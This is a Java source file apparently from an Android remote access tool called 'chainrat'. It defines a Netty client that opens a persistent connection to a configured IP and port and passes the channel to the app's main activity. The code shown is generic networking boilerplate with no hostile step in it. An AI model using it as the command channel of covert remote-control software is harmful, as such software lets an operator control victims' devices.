package com.nefi.chainrat.networking;

import com.nefi.chainrat.MainActivity;
import com.nefi.chainrat.MainService;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelOption;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.nio.NioSocketChannel;

public class ChainControlClient implements Runnable {

    private String IP;
    private int port;

    public ChainControlClient(String IP, int port){
        this.IP = IP;
        this.port = port;
    }
    @Override
    public void run() {
        EventLoopGroup workerGroup = new NioEventLoopGroup();

        try {
            Bootstrap b = new Bootstrap(); // (1)
            b.group(workerGroup); // (2)
            b.channel(NioSocketChannel.class); // (3)
            b.option(ChannelOption.SO_KEEPALIVE, true); // (4)
            b.handler(new ChainClientChannelInitializer());
            ChannelFuture f = b.connect(this.IP, this.port).sync(); // (5)
            MainActivity.setChannel(f.channel());

            f.channel().closeFuture().sync();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            workerGroup.shutdownGracefully();
        }
    }
}
